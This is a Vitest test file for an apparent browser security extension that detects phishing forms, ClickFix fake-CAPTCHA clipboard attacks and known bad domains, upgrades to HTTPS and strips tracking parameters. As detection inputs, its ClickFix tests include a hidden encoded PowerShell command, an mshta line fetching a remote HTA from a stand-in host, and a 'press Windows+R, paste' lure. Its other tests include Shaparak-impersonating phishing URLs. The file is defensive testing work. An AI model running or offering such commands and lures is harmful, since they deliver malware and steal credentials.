import { describe, it, expect, beforeEach } from 'vitest';
import { installChromeMock } from './helpers/chrome-mock.js';
import { loadCore } from './helpers/load-core.js';

describe('Feature 1 — CorsairCredentialGuard (Credential & Phishing Form Guard)', () => {
  beforeEach(() => {
    installChromeMock();
    loadCore('core/credential-guard.js');
  });

  it('detects password and payment card fields including Persian banking labels without reading values', () => {
    let valueAccessed = false;
    const fields = [
      { type: 'password', autocomplete: 'current-password', get value() { valueAccessed = true; return 'secret'; } },
      { type: 'text', placeholder: 'شماره کارت بانکی', autocomplete: 'cc-number', get value() { valueAccessed = true; return '6037'; } }
    ];
    const info = CorsairCredentialGuard.analyzeFormFields(fields);
    expect(info.sensitive).toBe(true);
    expect(info.categories).toContain('password');
    expect(info.categories).toContain('payment');
    expect(valueAccessed).toBe(false);
  });

  it('warns on HTTP password/payment forms, cross-origin destinations, and Iranian brand impersonation', () => {
    const httpLogin = CorsairCredentialGuard.evaluateSubmission({
      pageUrl: 'http://example.org/login',
      actionUrl: 'http://example.org/auth',
      fields: [{ type: 'password' }]
    });
    expect(httpLogin.shouldWarn).toBe(true);
    expect(httpLogin.reasons).toContain('insecure-http-page');

    const fakeShaparak = CorsairCredentialGuard.evaluateSubmission({
      pageUrl: 'https://shaparak-pay-verify.xyz/pay',
      actionUrl: 'https://shaparak-pay-verify.xyz/submit',
      fields: [{ type: 'text', autocomplete: 'cc-number' }, { type: 'password', placeholder: 'رمز دوم' }]
    });
    expect(fakeShaparak.shouldWarn).toBe(true);
    expect(fakeShaparak.severity).toBe('critical');
    expect(fakeShaparak.reasons).toContain('brand-impersonation:shaparak');

    const crossOrigin = CorsairCredentialGuard.evaluateSubmission({
      pageUrl: 'https://shop.example.com/checkout',
      actionUrl: 'https://evil-collector.net/steal',
      fields: [{ type: 'text', autocomplete: 'cc-csc' }]
    });
    expect(crossOrigin.shouldWarn).toBe(true);
    expect(crossOrigin.reasons).toContain('cross-origin-destination');
  });

  it('allows legitimate HTTPS login, official Shaparak/OAuth providers, and trusted hosts without false positives', () => {
    const legit = CorsairCredentialGuard.evaluateSubmission({
      pageUrl: 'https://bpm.shaparak.ir/pgwchannel/startpay.mellat',
      actionUrl: 'https://bpm.shaparak.ir/pgwchannel/pay',
      fields: [{ type: 'text', autocomplete: 'cc-number' }, { type: 'password' }]
    });
    expect(legit.shouldWarn).toBe(false);

    const oauth = CorsairCredentialGuard.evaluateSubmission({
      pageUrl: 'https://myapp.example.com/login',
      actionUrl: 'https://accounts.google.com/o/oauth2/auth',
      fields: [{ type: 'password' }]
    });
    expect(oauth.shouldWarn).toBe(false);

    const trusted = CorsairCredentialGuard.evaluateSubmission({
      pageUrl: 'http://intranet.corp/login',
      actionUrl: 'http://intranet.corp/login',
      fields: [{ type: 'password' }],
      trustedHosts: ['intranet.corp']
    });
    expect(trusted.shouldWarn).toBe(false);
  });
});

describe('Feature 2 — CorsairClickFixGuard (ClickFix & Fake-CAPTCHA Protection)', () => {
  beforeEach(() => {
    installChromeMock();
    loadCore('core/clickfix-guard.js');
  });

  it('detects high-confidence ClickFix PowerShell/mshta + fake CAPTCHA attacks', () => {
    const res = CorsairClickFixGuard.analyze({
      text: 'powershell -w hidden -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
      pageText: 'Verify you are human: Press Windows + R, press Ctrl+V and hit Enter',
      host: 'verify-human-captcha.xyz',
      source: 'clipboard-api'
    });
    expect(res.suspicious).toBe(true);
    expect(res.severity).toBe('critical');
    expect(res.shouldSuppress).toBe(true);
    expect(res.signals).toContain('encoded-command');
    expect(res.signals).toContain('win-r-instruction');

    const mshta = CorsairClickFixGuard.analyze({
      text: 'mshta https://evil.test/verify.hta # I am not a robot',
      pageText: 'Human verification steps',
      host: 'check-browser.top',
      source: 'clipboard-api'
    });
    expect(mshta.suspicious).toBe(true);
    expect(mshta.signals).toContain('mshta-remote');
  });

  it('dampens benign developer documentation snippets and ignores normal clipboard text', () => {
    const devDoc = CorsairClickFixGuard.analyze({
      text: 'powershell -ExecutionPolicy Bypass -File ./build.ps1',
      pageText: 'Microsoft PowerShell documentation reference guide',
      host: 'learn.microsoft.com',
      source: 'copy'
    });
    expect(devDoc.suspicious).toBe(false);
    expect(devDoc.isDevDocs).toBe(true);

    const benign = CorsairClickFixGuard.analyze({
      text: 'Hello world, this is a normal paragraph about PowerShell tutorials.',
      pageText: 'Blog post',
      host: 'blog.example.com',
      source: 'copy'
    });
    expect(benign.suspicious).toBe(false);
  });
});

describe('Feature 3 — CorsairOfflineIntel (Offline Bloom Threat Intelligence)', () => {
  beforeEach(async () => {
    installChromeMock();
    loadCore('core/bloom.js');
    loadCore('core/offline-intel.js');
    await CorsairOfflineIntel.init();
  });

  it('matches known indicators offline, ignores clean domains, and normalizes URLs/IDN', () => {
    const hit = CorsairOfflineIntel.lookup('https://shaparak-verify-card.xyz/pay?id=1');
    expect(hit.hit).toBe(true);
    expect(hit.bloomPositive).toBe(true);
    expect(hit.matchType).toBe('domain');

    const urlHit = CorsairOfflineIntel.lookup('http://testsafebrowsing.appspot.com/s/phishing.html#frag');
    expect(urlHit.hit).toBe(true);
    expect(urlHit.matchType).toBe('url');

    const clean = CorsairOfflineIntel.lookup('https://www.wikipedia.org/wiki/Security');
    expect(clean.hit).toBe(false);
    expect(CorsairOfflineIntel.normalizeDomain('bücher.de')).toBe('xn--bcher-kva.de');
  });

  it('validates SHA-256 integrity, rolls back corrupt/mismatched updates, and reports status', async () => {
    const badShape = await CorsairOfflineIntel.applyDatasetUpdate({ bad: true });
    expect(badShape.ok).toBe(false);
    expect(badShape.rolledBack).toBe(true);

    const badHash = await CorsairOfflineIntel.applyDatasetUpdate(
      { version: '2026.12.1', domains: ['evil-new.xyz'], urls: [] },
      '0000000000000000000000000000000000000000000000000000000000000000'
    );
    expect(badHash.ok).toBe(false);
    expect(badHash.error).toBe('integrity-mismatch');
    expect(CorsairOfflineIntel.lookup('evil-new.xyz').hit).toBe(false);

    const payload = { version: '2026.12.2', domains: ['new-phish.top'], urls: [] };
    const hash = await CorsairOfflineIntel.sha256Hex(JSON.stringify(payload));
    const good = await CorsairOfflineIntel.applyDatasetUpdate(payload, hash);
    expect(good.ok).toBe(true);
    expect(CorsairOfflineIntel.lookup('https://new-phish.top/login').hit).toBe(true);
    expect(CorsairOfflineIntel.getStatus().version).toBe('2026.12.2');
  });
});

describe('Feature 4 — CorsairHttpsFirst (HTTPS-First DNR Protection)', () => {
  beforeEach(() => {
    installChromeMock();
    loadCore('core/https-first.js');
  });

  it('upgrades eligible HTTP GET navigations while preserving host/path/query/fragment and skipping localhost/POST/ports', () => {
    const up = CorsairHttpsFirst.previewUpgrade('http://example.com/a/b?x=1&y=2#top');
    expect(up.upgraded).toBe(true);
    expect(up.url).toBe('https://example.com/a/b?x=1&y=2#top');

    expect(CorsairHttpsFirst.previewUpgrade('http://localhost:3000/app').upgraded).toBe(false);
    expect(CorsairHttpsFirst.previewUpgrade('http://127.0.0.1/test').upgraded).toBe(false);
    expect(CorsairHttpsFirst.previewUpgrade('http://192.168.1.1/').upgraded).toBe(false);
    expect(CorsairHttpsFirst.previewUpgrade('http://example.com:8080/').upgraded).toBe(false);
    expect(CorsairHttpsFirst.previewUpgrade('http://example.com/submit', { method: 'POST' }).upgraded).toBe(false);
    expect(CorsairHttpsFirst.previewUpgrade('http://legacy.test/', { exceptions: ['legacy.test'] }).upgraded).toBe(false);
  });

  it('syncs DNR rule 950001 at priority 10 without touching Fortress or Global Block rules', async () => {
    await chrome.declarativeNetRequest.updateDynamicRules({
      addRules: [{ id: 100001, priority: 100, action: { type: 'block' }, condition: { urlFilter: 'bad.test' } }]
    });
    const res = await CorsairHttpsFirst.sync({ enabled: true, exceptions: ['http-only.test'] });
    expect(res.ok).toBe(true);
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    expect(rules.some(r => r.id === 100001)).toBe(true);
    const httpsRule = rules.find(r => r.id === CorsairHttpsFirst.RULE_ID);
    expect(httpsRule.action.type).toBe('upgradeScheme');
    expect(httpsRule.priority).toBe(10);
    expect(httpsRule.condition.excludedRequestDomains).toContain('localhost');
    expect(httpsRule.condition.excludedRequestDomains).toContain('http-only.test');
  });
});

describe('Feature 5 — CorsairTrackingStrip (Tracking Parameter Stripping DNR)', () => {
  beforeEach(() => {
    installChromeMock();
    loadCore('core/tracking-strip.js');
  });

  it('strips verified tracking parameters while preserving legitimate, auth, OAuth, payment, and signed URLs', () => {
    const cleaned = CorsairTrackingStrip.stripUrl('https://news.example.com/article?id=42&utm_source=twitter&fbclid=abc123&gclid=xyz&page=2');
    expect(cleaned.changed).toBe(true);
    expect(cleaned.removed).toEqual(['utm_source', 'fbclid', 'gclid']);
    expect(cleaned.url).toBe('https://news.example.com/article?id=42&page=2');

    // Signed URL untouched
    const signed = CorsairTrackingStrip.stripUrl('https://bucket.s3.amazonaws.com/f.zip?X-Amz-Signature=deadbeef&utm_source=email');
    expect(signed.changed).toBe(false);

    // OAuth / payment domains untouched
    const oauth = CorsairTrackingStrip.stripUrl('https://accounts.google.com/o/oauth2/auth?code=123&utm_source=app');
    expect(oauth.changed).toBe(false);

    // User exception untouched
    const exc = CorsairTrackingStrip.stripUrl('https://shop.example.com/?utm_campaign=sale', { exceptions: ['shop.example.com'] });
    expect(exc.changed).toBe(false);
  });

  it('syncs DNR rule 960001 at priority 15 without colliding with HTTPS-First or Fortress rules', async () => {
    await chrome.declarativeNetRequest.updateDynamicRules({
      addRules: [{ id: 800001, priority: 50, action: { type: 'block' }, condition: { urlFilter: 'fortress.test' } }]
    });
    const res = await CorsairTrackingStrip.sync({ enabled: true, exceptions: ['keep-utm.test'] });
    expect(res.ok).toBe(true);
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    expect(rules.some(r => r.id === 800001)).toBe(true);
    const trackRule = rules.find(r => r.id === CorsairTrackingStrip.RULE_ID);
    expect(trackRule.action.type).toBe('redirect');
    expect(trackRule.action.redirect.transform.queryTransform.removeParams).toContain('utm_source');
    expect(trackRule.action.redirect.transform.queryTransform.removeParams).toContain('fbclid');
    expect(trackRule.condition.excludedRequestDomains).toContain('keep-utm.test');
  });
});
